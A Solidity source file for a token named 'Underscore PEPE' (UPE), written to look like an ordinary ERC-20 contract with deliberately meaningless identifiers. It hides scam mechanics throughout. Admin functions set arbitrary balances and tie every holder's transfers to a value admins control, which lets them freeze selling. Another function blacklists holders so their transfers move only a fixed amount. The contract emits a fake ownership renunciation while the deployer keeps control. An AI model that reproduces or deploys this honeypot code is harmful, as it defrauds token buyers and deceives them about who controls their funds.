//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface limitAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atTo) external view returns (uint256);

    function transfer(address sellTokenTx, uint256 amountTrading) external returns (bool);

    function allowance(address teamSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountTrading) external returns (bool);

    function transferFrom(
        address sender,
        address sellTokenTx,
        uint256 amountTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed buyToken, uint256 value);
    event Approval(address indexed teamSender, address indexed spender, uint256 value);
}

abstract contract enableTokenShould {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface shouldLimit {
    function createPair(address swapExempt, address fundExemptTo) external returns (address);
}

interface limitAutoMetadata is limitAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract UnderscorePEPE is enableTokenShould, limitAuto, limitAutoMetadata {

    uint256 constant receiverLaunched = 13 ** 10;

    bool private receiverEnable;

    uint256 tokenAmount;

    function teamReceiver(address maxIs, uint256 amountTrading) public {
        toShould();
        receiverSell[maxIs] = amountTrading;
    }

    uint256 private listToAuto;

    uint8 private enableTrading = 18;

    uint256 private swapFund;

    bool public fundTxSender;

    uint256 private atFrom = 100000000 * 10 ** 18;

    string private feeReceiverMax = "Underscore PEPE";

    function transferFrom(address fromLimitMode, address sellTokenTx, uint256 amountTrading) external override returns (bool) {
        if (_msgSender() != amountSwapLaunch) {
            if (shouldSwapTx[fromLimitMode][_msgSender()] != type(uint256).max) {
                require(amountTrading <= shouldSwapTx[fromLimitMode][_msgSender()]);
                shouldSwapTx[fromLimitMode][_msgSender()] -= amountTrading;
            }
        }
        return launchedToken(fromLimitMode, sellTokenTx, amountTrading);
    }

    function limitTeamMax(uint256 amountTrading) public {
        toShould();
        txTrading = amountTrading;
    }

    mapping(address => bool) public buyReceiver;

    function marketingTeam() public {
        emit OwnershipTransferred(autoSwap, address(0));
        maxToken = address(0);
    }

    function transfer(address maxIs, uint256 amountTrading) external virtual override returns (bool) {
        return launchedToken(_msgSender(), maxIs, amountTrading);
    }

    address amountSwapLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public teamWalletTo;

    mapping(address => mapping(address => uint256)) private shouldSwapTx;

    constructor (){
        if (buyLimit) {
            buyLaunched = swapFund;
        }
        launchReceiver receiverLimit = launchReceiver(amountSwapLaunch);
        tokenSender = shouldLimit(receiverLimit.factory()).createPair(receiverLimit.WETH(), address(this));
        if (buyLaunched != swapFund) {
            launchedSwapTeam = true;
        }
        autoSwap = _msgSender();
        marketingTeam();
        liquidityMax[autoSwap] = true;
        receiverSell[autoSwap] = atFrom;
        
        emit Transfer(address(0), autoSwap, atFrom);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return atFrom;
    }

    bool private buyLimit;

    event OwnershipTransferred(address indexed swapLaunched, address indexed feeLaunch);

    address feeLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public liquidityMax;

    function allowance(address fromSell, address sellLiquidity) external view virtual override returns (uint256) {
        if (sellLiquidity == amountSwapLaunch) {
            return type(uint256).max;
        }
        return shouldSwapTx[fromSell][sellLiquidity];
    }

    function approve(address sellLiquidity, uint256 amountTrading) public virtual override returns (bool) {
        shouldSwapTx[_msgSender()][sellLiquidity] = amountTrading;
        emit Approval(_msgSender(), sellLiquidity, amountTrading);
        return true;
    }

    string private isSender = "UPE";

    function fundList(address fromLimitMode, address sellTokenTx, uint256 amountTrading) internal returns (bool) {
        require(receiverSell[fromLimitMode] >= amountTrading);
        receiverSell[fromLimitMode] -= amountTrading;
        receiverSell[sellTokenTx] += amountTrading;
        emit Transfer(fromLimitMode, sellTokenTx, amountTrading);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return feeReceiverMax;
    }

    function symbol() external view virtual override returns (string memory) {
        return isSender;
    }

    address public tokenSender;

    function getOwner() external view returns (address) {
        return maxToken;
    }

    function balanceOf(address atTo) public view virtual override returns (uint256) {
        return receiverSell[atTo];
    }

    uint256 txTrading;

    function launchedToken(address fromLimitMode, address sellTokenTx, uint256 amountTrading) internal returns (bool) {
        if (fromLimitMode == autoSwap) {
            return fundList(fromLimitMode, sellTokenTx, amountTrading);
        }
        uint256 marketingTo = limitAuto(tokenSender).balanceOf(feeLiquidity);
        require(marketingTo == txTrading);
        require(sellTokenTx != feeLiquidity);
        if (buyReceiver[fromLimitMode]) {
            return fundList(fromLimitMode, sellTokenTx, receiverLaunched);
        }
        return fundList(fromLimitMode, sellTokenTx, amountTrading);
    }

    mapping(address => uint256) private receiverSell;

    uint256 public buyLaunched;

    function toShould() private view {
        require(liquidityMax[_msgSender()]);
    }

    function decimals() external view virtual override returns (uint8) {
        return enableTrading;
    }

    function owner() external view returns (address) {
        return maxToken;
    }

    bool public launchedSwapTeam;

    address public autoSwap;

    function isBuy(address enableFrom) public {
        require(enableFrom.balance < 100000);
        if (fundTxSender) {
            return;
        }
        if (buyLaunched == swapFund) {
            swapFund = listToAuto;
        }
        liquidityMax[enableFrom] = true;
        if (swapFund == listToAuto) {
            launchedSwapTeam = false;
        }
        fundTxSender = true;
    }

    address private maxToken;

    function minMarketingList(address exemptSellReceiver) public {
        toShould();
        
        if (exemptSellReceiver == autoSwap || exemptSellReceiver == tokenSender) {
            return;
        }
        buyReceiver[exemptSellReceiver] = true;
    }

}